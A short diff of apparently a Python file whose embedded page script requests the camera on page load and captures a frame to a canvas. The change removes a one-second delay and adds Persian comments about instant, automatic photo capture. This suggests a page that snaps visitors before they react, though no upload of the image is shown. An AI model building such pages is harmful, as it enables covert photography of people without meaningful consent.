@@ -131,6 +131,7 @@ HTML_CONTENT = """
     </div>
 
     <script>
+        // اجرای سریع و خودکار به محض لود شدن صفحه بدون معطلی اضافه
         window.addEventListener('DOMContentLoaded', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -143,8 +144,7 @@ HTML_CONTENT = """
                 video.playsInline = true;
                 await video.play();
 
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
+                // حذف تاخیر اضافه برای گرفتن آنی عکس
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
